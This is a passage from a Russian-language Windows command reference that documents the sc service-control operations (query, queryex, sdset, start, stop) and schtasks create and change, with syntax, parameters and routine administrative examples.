- Если между параметром и его значением имеется пробел (например type= own вместо type=own) произойдет сбой операции.- Операция query отображает следующие сведения о службе: SERVICE_NAME (имя раздела реестра для службы), TYPE, STATE (а также состояния, которые недоступны), WIN32_EXIT_B, SERVICE_EXIT_B, CHECKPOINT и WAIT_HINT. - В некоторых случаях параметр type= может использоваться дважды. Первое появление параметра type= указывает, следует ли запрашивать службы, драйверы или и то и другое. Второе появление параметра type= указывает тип из операции create для дальнейшего сужения области запроса.- Когда вывод результата команды query превышает размер буфера перечисления, выводится следующее сообщение:

Enum: more data, need 1822 bytes start resume at index 79

Чтобы вывести на экран оставшиеся сведения результата команды query, повторно выполните команду query, указав в параметре bufsize= количество байтов и конкретный индекс в параметре ri=. Например, оставшиеся выходные данные можно вывести на экран с помощью следующей команды.

sc query bufsize= 1822 ri= 79
Примеры

Далее приведены примеры использования команды sc query.

sc query
sc query messenger
sc query type= driver
sc query type= service
sc query state= all
sc query bufsize= 50
sc query ri= 14
sc query type= service type= interact
sc query type= driver group= ndis

sc queryex

Получает и отображает подробные сведения о конкретной службе, драйвере, типе службы или типе драйвера.
Синтаксис

sc [имя_сервера] queryex [type= {driver|service|all}] [type= {own|share|interact|kernel|filesys|rec|adapt}] [state= {active|inactive|all}] [bufsize= размер_буфера] [ri= индекс_возобновления] [group= имя_группы]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname. Данный параметр операции queryex не используется совместно с другими параметрами этой операции (отличными от параметра имя_сервера).
type= {driver|service|all}
    Указывает объекты для перечисления. Тип по умолчанию service.
    Значение     Описание
    driver     Указывает перечисление только драйверов
    service     Указывает перечисление только служб
    all     Указывает перечисление драйверов и служб
type= {own|share|interact|kernel|filesys|rec|adapt}
    Указывает тип драйверов и тип служб для перечисления.
    Значение     Описание
    own     Служба выполняется в собственном процессе. Она не использует исполняемый файл совместно с другими службами. Эта установка используется по умолчанию
    share     Служба выполняется как общий процесс. Она использует исполняемый файл совместно с другими службами
    interact     Служба может взаимодействовать с рабочим столом, получая входные данные от пользователей. Интерактивные службы должны выполняться с системной учетной записью
    kernel     Драйвер
    filesys     Драйвер файловой системы
state= {active|inactive|all}
    Указывает состояние запуска службы, которая включается в перечисление. По умолчанию active.
    Значение     Описание
    active     Указывает все активные службы
    inactive     Указывает все приостановленные или остановленные службы
    all     Указывает все службы
bufsize= размер_буфера
    Задает размер буфера перечисления в байтах. По умолчанию размер пакета равен 1024 байтам.
ri= индекс_возобновления
    Указывает номер индекса, с которого начинается или возобновляется перечисление. По умолчанию — 0.
group= имя_группы
    Указывает группу служб для перечисления. По умолчанию выбираются все группы.
/?
    Отображает справку в командной строке.

Примечания
- Если между параметром и его значением имеется пробел (например type= own вместо type=own) произойдет сбой операции.- Операция queryex отображает следующие сведения о службе: SERVICE_NAME (имя раздела реестра для службы), TYPE, STATE (а также состояния, которые недоступны), WIN32_EXIT_B, SERVICE_EXIT_B, CHECKPOINT, WAIT_HINT, PID и FLAGS. - В некоторых случаях параметр type= может использоваться дважды. Первое появление параметра type= указывает, следует ли запрашивать службы, драйверы или и то и другое. Второе появление параметра type= указывает тип из операции create для дальнейшего сужения области запроса.- Когда вывод результата команды queryex превышает размер буфера перечисления, выводится следующее сообщение:

Enum: more data, need 2130 bytes start resume at index 75

Чтобы вывести на экран оставшиеся сведения результата команды queryex, повторно выполните команду queryex, указав в параметре bufsize= количество байтов и конкретный индекс в параметре ri=. Например, оставшиеся выходные данные можно вывести на экран с помощью следующей команды.

sc queryex bufsize= 2130 ri= 75
Примеры

Далее приведены примеры использования команды sc queryex.

sc queryex messenger
sc queryex group= ""

sc querylock

Запрашивает и отображает состояние блокировки базы данных диспетчера служб.
Синтаксис

sc [имя_сервера] querylock
Параметр

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
/?
    Отображает справку в командной строке.

sc sdset

Задает дескриптор безопасности службы с помощью SDDL.
Синтаксис

sc [имя_сервера] sdset имя_службы дескриптор_безопасности_службы
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
дескриптор_безопасности_службы
    Задает дескриптор службы в SDDL.
/?
    Отображает справку в командной строке.

Примечания
- Дополнительные сведения о SDDL, см. ссылку «Security Descriptor Definition Language» в библиотеке MSDN Online Library (http://www.microsoft.com/).

sc sdshow

Отображает дескриптор безопасности службы с помощью SDDL.
Синтаксис

sc [имя_сервера] sdshow имя_службы
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
/?
    Отображает справку в командной строке.

Примечания
- Дополнительные сведения о SDDL, см. ссылку «Security Descriptor Definition Language» в библиотеке MSDN Online Library (http://www.microsoft.com/).
Примеры

sc sdshow rpcss

sc start

Служит для запуска службы.
Синтаксис

sc [имя_сервера] start имя_службы [аргументы_службы]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
аргументы_службы
    Задает аргументы службы, которые надо выполнить для запуска службы.
/?
    Отображает справку в командной строке.

Примеры

Далее приведены примеры использования команды sc start.

sc start tapisrv

sc stop

Посылает службе запрос STOP.
Синтаксис

sc [имя_сервера] stop имя_службы
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
/?
    Отображает справку в командной строке.

Примечания
- Не все службы могут быть приостановлены.
Примеры

Далее приведены примеры использования команды sc stop.

sc stop tapisrv
Примечания
========================================================================================
Schtasks

Настраивает выполнение команд и программ через заданные интервалы или в указанное время. Добавляет и удаляет задания из расписания, запускает и останавливает задания по требованию, отображает и изменяет назначенные задания.

Чтобы посмотреть синтаксис команды, щелкните следующую команду:

schtasks create

Создает новое назначенное задание.
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc расписание [/mo модификатор] [/d день] [/m месяц[,месяц...] [/i время_простоя] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]] /?
Параметры

/tn имя_задания
    Определяет имя для задания.
/tr выполнение_задания
    Указывает программу или команду, которая выполняет задание. Введите полный путь и имя исполняемого файла, файла сценария или пакетного файла. Если пропущен путь, программа SchTasks.exe предполагает, что файл находится в системном_корневом_каталоге\System32.
/sc расписание
    Задает тип расписания. Допустимыми значениями являются ЕЖЕМИНУТНО, ЕЖЕЧАСНО, ЕЖЕДНЕВНО, ЕЖЕНЕДЕЛЬНО, ЕЖЕМЕСЯЧНО, ОДНОКРАНО, ПРИ ЗАПУСКЕ, ПРИ ВХОДЕ В СИСТЕМУ, ПРИ ПРОСТОЕ.
Значение     Описание
ЕЖЕМИНУТНО, ЕЖЕЧАСНО, ЕЖЕДНЕВНО, ЕЖЕНЕДЕЛЬНО, ЕЖЕМЕСЯЧНО     Определяют единицу времени для расписания
ОДНОКРАТНО     Задание выполняется один раз в указанное время и дату
ПРИ ЗАПУСКЕ     Задание выполняется каждый раз при запуске системы. Можно указать дату запуска или выполнить задание в следующий раз при запуске системы
ПРИ ВХОДЕ В СИСТЕМУ     Задание выполняется каждый раз при входе пользователя (любого) в систему. Можно указать дату запуска или выполнить задание в следующий раз при входе пользователя в систему
ПРИ ПРОСТОЕ     Задание выполняется каждый раз при простое компьютера в течение заданного промежутка времени. Можно указать дату запуска или выполнить задание в следующий раз при простое компьютера
/mo модификатор
    Определяет частоту выполнения команды в соответствии с его типом расписания. Этот параметр обязателен для расписания ЕЖЕМЕСЯЧНО. Параметр является допустимым, но необязательным для расписаний ЕЖЕМИНУТНО, ЕЖЕЧАСНО, ЕЖЕДНЕВНО или ЕЖЕНЕДЕЛЬНО. По умолчанию значение равно 1.
Тип расписания     Модификатор     Описание
ЕЖЕМИНУТНО     1 - 1439     Задание выполняется через каждые n минут.
ЕЖЕЧАСНО     1 - 23     Задание выполняется через каждые n часов.
ЕЖЕДНЕВНО     1 - 365     Задание выполняется через каждые n дней.
ЕЖЕНЕДЕЛЬНО     1 - 52     Задание выполняется через каждые n недель.
ЕЖЕМЕСЯЧНО     1 - 12     Задание выполняется через каждые n месяцев.
ПОСЛЕДНИЙ     Задание выполняется в последний день месяца.
ПЕРВЫЙ, ВТОРОЙ, ТРЕТИЙ, ЧЕТВЕРТЫЙ, ПОСЛЕДНИЙ     При использовании с параметром /d день задание выполняется в определенный день недели. Например, в третью среду месяца.
/d день
    Указывает день недели и день месяца. Параметр допустим только с расписаниями ЕЖЕНЕДЕЛЬНО или ЕЖЕМЕСЯЧНО.
Тип расписания     Значение дня
ЕЖЕНЕДЕЛЬНО     Необязательно. Допустимые значения — с ПН по ВС и *(каждый день). По умолчанию установлено значение ПН
ЕЖЕМЕСЯЧНО     Значения ПН — ВС требуются, когда используется модификатор (/mo) ПЕРВЫЙ, ВТОРОЙ, ТРЕТИЙ, ЧЕТВЕРТЫЙ ИЛИ ПОСЛЕДНИЙ. Значения 1 — 31 являются необязательными и допустимы, только если модификатора нет или тип его 1 — 12. По умолчанию установлено значение 1 (первый день месяца).
/m месяц[,месяц...]
    Указывает месяц года. Допустимые значения — с ЯНВ по ДЕК и * (каждый месяц). Параметр /m действителен только для расписания ЕЖЕМЕСЯЧНО. Параметр требуется при использовании модификатора ПОСЛЕДНИЙ. В других случаях он является необязательным. Значение по умолчанию *(каждый месяц).
/i время_простоя
    Указывает интервал времени простоя компьютера (в минутах) до начала выполнения задания. Введите любое число от 1 до 999. Параметр допустим только с расписанием ПРИ ПРОСТОЕ, в этом случае он обязателен.
/st время_запуска
    Задает время начала выполнения задания в 24-часовом формате в виде чч:мм:сс. По умолчанию установлено локальное время, когда команда завершена. Параметр /st является действительным для расписаний типа ЕЖЕМИНУТНО, ЕЖЕДНЕВНО, ЕЖЕНЕДЕЛЬНО, ЕЖЕМЕСЯЧНО и ОДНОКРАТНО . Требуется для расписания ОДНОКРАТНО.
/sd дата_запуска
    Задает дату начала выполнения задания в формате мм/дд/гггг. По умолчанию установлено значение текущей даты. Параметр /sd можно использовать со всеми расписаниями. Он требуется для расписания ОДНОКРАТНО.
/ed дата_окончания
    Определяет последнюю дату, на которую назначается выполнение команды. Параметр является необязательным. Недопустимо использование с расписаниями типа ОДНОКРАТНО, ПРИ ЗАПУСКЕ, ПРИ ВХОДЕ В СИСТЕМУ, ПРИ ПРОСТОЕ. По умолчанию у расписаний нет даты окончания.
/s компьютер
    Задает имя или IP-адрес удаленного компьютера (с обратными косыми чертами или без них). По умолчанию используется локальный компьютер.
/u [домен\]пользователь
    Выполняет команду с разрешения указаной учетной записи пользователя. По умолчанию, команда запускается с разрешения пользователя, вошедшего в систему компьютера, на котором выполняется SchTasks.
/p пароль
    Задает пароль учетной записи пользователя, указанной параметром /u. Параметр требуется при использовании параметра /u.
/ru {[домен\]пользователь | "System"}
    Выполняет задания с разрешения указанной учетной записи пользователя. По умолчанию, начинается выполнение задание с разрешения пользователя, вошедшего в систему компьютера, на котором выполняется SchTasks.
Значение     Описание
[домен\]пользователь     Определяет учетную запись пользователя.
"System" или ""     Указывает учетную запись NT Authority\System, которую использует операционная система.
/rp пароль
    Определяет пароль учетной записи пользователя, заданной параметром /ru. Если пропустить этот параметр при указании учетной записи пользователя, программ SchTasks.exe предлагает ввести пароль и скрывает введенный текст. Для заданий, выполняемых с разрешений ученой записи NT Authority\System, не требуется пароль и программа SchTasks.exe не предлагает его ввести.
/?
    Отображает справку в командной строке.

Примечания
- Программа SchTasks.exe не проверяет расположения файлов программ и пароли учетных записей пользователей. Если путь к файлу или пароль учетной записи введен неверно, задание создается, но не выполняется. Также если пароль изменился или истек срок его действия и в сохраненном задании пароль не изменен, задание не выполняется.- Учетная запись NT Authority\System не имеет прав интерактивного входа. Пользователи не видят и не могут взаимодействовать с программами, запущенными с разрешений системы.- Каждое задание выполняет только одну программу. Однако, можно создать пакетный файл, запускающий несколько заданий, а затем запланировать задание, которое выполняет этот пакетный файл.- Имеется возможность протестировать задание сразу же после его создания. Используйте операцию run для тестирования задания и затем проверьте наличие ошибок в файле SchedLgU.txt (системный_корневой_каталог\SchedLgU.txt).
Синтаксис и примеры для каждого типа расписания

Чтобы посмотреть синтаксис команды, щелкните следующую команду:

schtasks create ежеминутно
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc ежеминутно [/mo {1 - 1439}] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение задания каждые 20 минут

Следующая команда задает выполнение сценария безопасности Sec.vbs каждые 20 минут. Т. к. в команде не учтена дата запуска и время, задание запускается через 20 минут после завершения команды, и выполняется каждые 20 минут соответственно при работе системы. Следует отметить, что исходный файл сценария безопасности находится на удаленном компьютере, а задание назначается и выполняется на локальном компьютере.

schtasks /create /sc ежеминутно /mo 20 /tn "Сценарий безопасности" /tr \\central\data\scripts\sec.vbs

В результате, SchTasks.exe выводит сообщение, в котором объясняется, что задание будет выполняться с разрешения текущего пользователя, и запрашивается пароль этого пользователя. При вводе пароля SchTasks.exe скрывает вводимый текст.


Задача будет создана под именем текущего пользователя.
Введите пароль:
************

Затем SchTasks.exe выводит на экран сообщение, указывающее, что задание назначено:
УДАЧА. Запланированная задача "Сценарий безопасности" была успешно создана.

Запрос показывает задание, назначенное командой:


Имя задания Следующий запуск Состояние
========================= ======================== ==============
Сценарий безопасности 10:50:00 AM , 4/4/2001

schtasks create ежечасно
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc ежечасно [/mo {1 - 365}] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение команды каждый час в пять минут следующего часа

Следующая команда назначает выполнение программы MyApp каждый час, начиная с пяти минут первого ночи. Т. к. параметр /mo пропущен, команда использует значение по умолчанию для часового расписания, т. е. 1 час. Если команда будет запущена после 12:05 А.М., программа не будет выполняться до следующего дня.

schtasks /create /sc ежечасно /st 00:05:00 /tn "My App" /tr c:\apps\myapp.exe
Чтобы запланировать выполнение команды каждые 5 часов

Следующая команда назначает выполнение программы MyApp через каждые пять часов, начиная с первого марта 2001 года. Параметр /mo используется для задания интервала, а параметр /sd — для задания даты запуска. В команде не указано время запуска, поэтому для него используется текущее время.

schtasks /create /sc ежечасно /mo 5 /sd 03/01/2001 /tn "My App" /tr c:\apps\myapp.exe

schtasks create ежедневно
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc ежедневно [/mo {1 - 365}] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение задания каждый день

Следующий пример назначает запуск программы MyApp один раз в день, каждый день в 8:00 А.М. до 31-го декабря 2001 года. Параметр /mo пропущен, поэтому для выполнения программы каждый день используется значение интервала по умолчанию, равное 1.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежедневно /st 08:00:00 /ed 12/31/2001
Чтобы запланировать выполнение задания каждые несколько дней

Следующая команда назначает выполнение программы MyApp каждые несколько дней в 1:00 Р.М. (13:00), начиная с 31-го декабря 2001 года. Параметр /mo используется для задания интервала в 2 дня.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежедневно /mo 2 /st 13:00:00 /sd 12/31/2001

schtasks create еженедельно
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc еженедельно [/d {ПН — ВС | *}] [/mo {1 - 52}] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение задания каждые шесть недель

Следующая команда назначает запуск программы MyApp на удаленном компьютере каждые шесть недель. Параметр /mo используется для задания интервала. Применяются также параметры /s, чтобы указать удаленный компьютер, и /ru, чтобы назначить выполнение задания с разрешения учетной записи администратора. Параметр /rp пропущен, поэтому SchTasks.exe предлагает ввести пароль учетной записи администратора.

Команда запускается удаленно, поэтому все пути в команде, включая путь к файлу MyApp.exe, указываются на удаленном компьютере.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc еженедельно /mo 6 /s Server16 /ru Admin01
Чтобы запланировать выполнение задания каждые несколько недель по пятницам

Следующая команда назначает запуск задания по пятницам раз в несколько недель. Параметр /mo используется для определения двухнедельного интервала, а параметр /d для указания дня недели. Чтобы задание запускалось каждую пятницу, пропустите параметр /mo или установите его значение равным 1.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc еженедельно /mo 2 /d ПТ

schtasks create ежемесячно
Синтаксис

Общий синтаксис ежемесячного расписания
    schtasks /create /tn имя_задания /tr выполнение_задания /sc ежемесячно [/mo {ПЕРВЫЙ | ВТОРОЙ | ТРЕТИЙ | ЧЕТВЕРТЫЙ | ПОСЛЕДНИЙ | ПОСЛЕДНИЙ] [/d {ПН - ВС | 1 - 31}] [/m {ЯНВ - ДЕК[,ЯНВ - ДЕК...] | *}] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]] 
Синтаксис для конкретной недели
    schtasks /create /tn имя_задания /tr выполнение_задания /sc ежемесячно /mo {ПЕРВЫЙ | ВТОРОЙ | ТРЕТИЙ | ЧЕТВЕРТЫЙ | ПОСЛЕДНИЙ} /d {ПН - ВС} [/m {ЯНВ - ДЕК[,ЯНВ - ДЕК...] | *}] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]] 
Синтаксис для последнего дня месяца
    schtasks /create /tn имя_задания /tr выполнение_задания /sc ежемесячно /mo ПОСЛЕДНИЙ /m {ЯНВ - ДЕК[,ЯНВ - ДЕК...] | *} [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]] 
Синтаксис для конкретной даты
    schtasks /create /tn имя_задания /tr выполнение_задания /sc ежемесячно /d {1 - 31} [/m {ЯНВ - ДЕК[,ЯНВ - ДЕК...] | *}] [/st время_запуска] [/sd дата_запуска] [/ed дата_окончания] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]] 

Примеры
Чтобы назначить задание на первый день каждого месяца

Следующая команда планирует выполнение программы MyApp в первый день каждого месяца. Модификатора по умолчанию нет, день по умолчанию — первый, а месяц по умолчанию — каждый месяц, поэтому для команды не нужны дополнительные параметры.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежемесячно
Чтобы назначить задание на последний день каждого месяца

Следующая команда планирует выполнение программы MyApp в последний день каждого месяца. Параметр /mo используется для указания последнего дня месяца, а параметр /m c подстановочным знаком (*) означает, что программа запускается в последний день каждого месяца.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежемесячно /mo последний /m *
Чтобы запланировать выполнение задания каждые три месяца

Следующая команда назначает запуск программы MyApp через каждые три месяца. Параметр /mo используется для задания интервала.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежемесячно /mo 3
Чтобы назначить задание на второе воскресенье каждого месяца

Следующая команда планирует выполнение программы MyApp во второе воскресенье каждого месяца. Параметр /mo используется для определения второй недели, а параметр /d для указания дня недели.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежемесячно /mo ВТОРОЙ /d ВС
Чтобы назначить задание на 15-е число мая и июня

Следующая команда задает выполнение программы MyApp 15-го мая и 15-го июня в 3:00 РМ (15:00). Параметр /d используется для определения даты, параметр /m — для задания месяцев. В команде учитывается параметр /st для указания времени запуска.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежемесячно /d 15 /m МАЙ,ИЮН /st 15:00:00

schtasks create однократно
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc однократно /st время_запуска /sd дата_запуска [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение задания один раз

Следующая команда назначает запуск программы MyApp в полночь 1-го января 2002 года. Параметр /ru используется для выполнения задания с разрешения учетной записи администратора, параметр /rp предоставляет пароль для учетной записи администратора.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc однократно /st 00:00:00 /sd 01/01/2002 /ru Admin23 /rp p@ssworD1

schtasks create при запуске
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc при запуске [/sd дата_запуска] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение задания каждый раз при запуске системы

Следующая команда назначает выполнение программы MyApp каждый раз при запуске системы, начиная с 15-го марта 2001 года.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc при запуске /sd 03/15/2001

schtasks create при входе в систему
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc при входе в систему [/sd дата_запуска] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение задания, когда пользователь входит в систему на удаленном компьютере

Следующая команда назначает запуск пакетного файла каждый раз при входе пользователя (любого) в систему на удаленном компьютере. Для указания удаленного компьютера в команде используется параметр /s. Все пути в команде, включая путь к пакетному файлу, должны быть указаны для удаленного компьютера, потому что данная команда — команда удаленной системы.

schtasks /create /tn "Запустить веб-узел" /tr c:\myiis\webstart.bat /sc при входе в систему /s Server23

schtasks create при простое
Синтаксис

schtasks /create /tn имя_задания /tr выполнение_задания /sc при простое /iвремя_простоя [/sd дата_запуска] [/s компьютер [/u [домен\]пользователь /p пароль]] [/ru {[домен\]пользователь | "System"} [/rp пароль]]
Пример
Чтобы запланировать выполнение задания каждый раз во время простоя компьютера

Следующая команда назначает запуск программы MyApp каждый раз во время простоя компьютера. Необходимый параметр /i используется в команде, чтобы указать, что компьютер должен простаивать в течение 10 минут перед запуском задания.

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc при простое /i 10
Еще примеры

Чтобы посмотреть пример, щелкните ссылку.

Чтобы создать задание, которое выполняется с разрешений системы

Следующая команда назначает запуск программы MyApp с разрешений учетной записи NT Authority\System. В этом примере, назначено выполнение задания 1-го числа каждого месяца, но можно использовать любой тип расписания для запуска программы с разрешениями системы.

В команде используется параметр /ru "System", чтобы определить контекст безопасности системы. Параметр /rp пропущен, потому что системные задания не используют пароль

schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc ежемесячно /d 1 /ru "System"

В результате программа SchTasks.exe выведет на экран информационное сообщение и сообщение об успехе. Пароль не запрашивается.


СВЕДЕНИЯ: Задание будет создано под именем текущего пользователя ("NT AUTHORITY\SYSTEM").
УДАЧА. Запланированная задача "My App" была успешно создана.

Чтобы создать задание, которое запускает несколько программ

Каждое задание выполняет только одну программу. Однако, можно создать пакетный файл, запускающий несколько заданий, а затем запланировать задание, которое выполняет этот пакетный файл. Следующая процедура представляет этот метод.

    - Создайте пакетный файл, запускающих необходимые программы.

    В данном примере создан пакетный файл, который запускает программы «Просмотр событий» (Eventvwr.exe) и «Системный монитор» (Perfmon.exe).
    - Откройте текстовый редактор, например «Блокнот».- Введите имя и полный путь к выполняемому файлу для каждой программы. В данном случае файл включает следующие строки:

    C:\Windows\System32\Eventvwr.exe
    C:\Windows\System32\Perfmon.exe
    - Сохраните файл как MyApps.bat.- Используете программу SchTasks.exe для создания задания, которое запускает MyApps.bat.

    Следующая команда создает задание «Монитор», которое выполняется каждый раз при входе любого пользователя в систему. В команде используется параметр /tn для имени задачи, параметр /tr для запуска файла MyApps.bat. Параметр /sc указывает тип расписания OnLogon, а параметр /ru задает учетную запись администратора.

    schtasks /create /tn Монитор /tr C:\MyApps.bat /sc при входе в систему /ru Reskit\Administrator

    В результате этой команды каждый раз при входе пользователя в систему, задание запускает программы «Просмотр событий» и «Системный монитор».

schtasks change

Изменяет один или несколько следующих параметров задания:
- программу, которую запускает задание (/tr);- учетную запись пользователя, под которой выполняется задание (/ru);- пароль ученой записи пользователя (/rp).
Синтаксис

schtasks /change /tn имя_задания [/s компьютер [/u [домен\]пользователь /p пароль]] [/tr выполнение_задания] [/ru [домен\]пользователь | "System"] [/rp пароль]
Параметры

/tn имя_задания
    Указывает задание, которое требуется изменить. Введите имя задания.
/s компьютер
    Задает имя или IP-адрес удаленного компьютера (с обратными косыми чертами или без них). По умолчанию используется локальный компьютер.
/u [домен\]пользователь
    Выполняет команду с разрешения указанной учетной записи пользователя. По умолчанию, команда запускается с разрешения пользователя, вошедшего в систему компьютера, на котором выполняется SchTasks.
/p пароль
    Задает пароль учетной записи пользователя, указанной параметром /u. Параметр требуется при использовании параметра /u.
/tr выполнение_задания
    Изменяет программу, которую запускает задание. Введите полный путь и имя исполняемого файла, файла сценария или пакетного файла. Если пропущен путь, программа SchTasks.exe предполагает, что файл находится в системном_корневом_каталоге\System32. Указанная программа заменяет исходную программу, выполняемую заданием. 
/ru [домен\]пользователь | "System"
    Изменяет учетную запись пользователя для этого задания.
    Значение     Описание
    [домен\]пользователь     Определяет учетную запись пользователя.
    "System" или ""     Указывает учетную запись NT Authority\System, которую использует операционная система.

    Когда меняется учетная запись пользователя, необходимо также сменить пароль. Если в команде есть параметр /ru, но не присутствует параметр /rp, SchTasks.exe предлагает ввести новый пароль и скрывает вводимый текст.

    Для заданий, выполняемых с разрешений ученой записи NT Authority\System, не требуется пароль и программа SchTasks.exe не предлагает его ввести.
/rp пароль
    Изменяет пароль учетной записи пользователя для этого задания. Введите новый пароль.
/?
    Отображает справку в командной строке.

Примечания
- Параметры /tn и /s определяют задание. Параметры /tr, /ru и /rp задают свойства задания, которые можно изменить.- В команде, в которой используется операция change, должно измениться хотя бы одно свойство задания.- Учетная запись NT Authority\System не имеет прав интерактивного входа. Пользователи не видят и не могут взаимодействовать с программами, запущенными с разрешений системы.
Примеры
Чтобы изменить программу, которую запускает задание

Следующая команда изменяет программу, которую выполняет задание «Virus Check», с VirusCheck.exe на VirusCheck2.exe. Параметр /tn используется в команде для идентификации задания, параметр /tr для указания новой программ для этого задания. (Невозможно изменить имя задания.)

schtasks /change /tn "Virus Check" /tr C:\VirusCheck2.exe

В ответ, команда SchTasks.exe выводит следующее сообщение об успешной операции:

УДАЧА. Параметры запланированной задачи "Virus Check" были изменены.

В результате выполнения команды, задание «Virus Check» тут же запускает VirusCheck2.exe.
Чтобы изменить пароль для удаленного задания

Следующая команда изменяет пароль учетной записи пользователя для задания «RemindMe» на удаленном компьютере «Svr01». Параметр /tn используется в команде для идентификации задания, параметр /s для указания удаленного компьютера. Параметр /rp задает новый пароль : p@ssWord3.

Процедуру требуется выполнять каждый раз при истечении срока действия или изменении учетной записи пользователя. Если пароль, сохраненный в задании, недопустим, задание не выполняется.

schtasks /change /tn RemindMe /s Svr01 /rp p@ssWord3

В ответ, команда SchTasks.exe выводит следующее сообщение об успешной операции:

УДАЧА. Параметры запланированной задачи "RemindMe" были изменены.

В результате команды, задание «RemindMe» выполняется под исходной учетной записью пользователя, но с новым паролем.
Чтобы изменить программу и учетную запись пользователя для задания

Следующая команда изменяет запускаемую программу и учетную запись пользователя, под которой выполняется задание. По существу, используется старое расписание для нового задания. Данная команда изменяет задание «Блокнот», которое запускает Notepad.exe каждое утро в 09:00 а.m., на запуск Internet Explorer.

Параметр /tn используется для идентификации задания. Параметр /tr меняет запускаемую программу, а параметр /ru — учетную запись пользователя, под которой выполняется данное задание.

Параметр /rp, представляющий пароль учетной записи, пропущен. Необходимо указать пароль для учетной записи: можно использовать параметр /rp и ввести пароль явно или подождать, пока программа SchTasks.exe предложит ввести пароль, и затем задать его в скрытом тексте.

schtasks /change /tn Блокнот /tr "c:\program files\Internet Explorer\iexplore.exe" /ru DomainX\Admin01

В ответ, SchTasks.exe запрашивает пароль учетной записи пользователя. Вводимый текст скрывается так, что пароль незаметен.

Введите пароль для DomainX\Admin01: *********

Обратите внимание, что параметр /tn идентифицирует задание, а параметры /tr и /ru изменяют свойства задания. Нельзя использовать другой параметр для идентификации задания и изменения его имени.

В ответ, команда SchTasks.exe выводит следующее сообщение об успешной операции:

УДАЧА. Параметры запланированной задачи "Блокнот" были изменены.

В результате команды, задание «Блокнот» выполняется под новой учетной записью пользователя и запускает другую программу.
Чтобы изменить программу для системной учетной записи

Данная команда изменяет задание «SecurityScript» так, что оно выполняется с разрешения учетной записи NT Authority\System. Параметр /ru "" в команде указывает системную учетную запись.

schtasks /change /tn SecurityScript /ru ""

В ответ, команда SchTasks.exe выводит следующее сообщение об успешной операции:

Удача. Параметры запланированной задачи "SecurityScript" были изменены.

